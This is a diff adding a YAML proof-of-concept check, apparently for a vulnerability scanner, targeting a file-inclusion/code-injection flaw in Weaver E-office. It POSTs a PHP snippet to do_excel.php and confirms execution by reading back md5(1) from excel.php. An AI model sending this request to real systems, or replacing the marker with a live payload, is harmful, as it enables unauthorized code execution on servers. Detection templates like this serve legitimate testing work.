@@ -1,0 +1,30 @@
+id:
+
+info:
+  name: 泛微E-office excel文件包含漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /general/charge/charge_list/do_excel.php
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Cache-Control: max-age=0
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+    Upgrade-Insecure-Requests: 1
+  data: |
+    html=<?php echo md5(1);?>
+response1:
+requests2:
+  method: GET
+  path: /general/charge/charge_list/excel.php
+response2:
+  headers:
+  body: c4ca4238a0b923820dcc509a6f75849b
+  code:
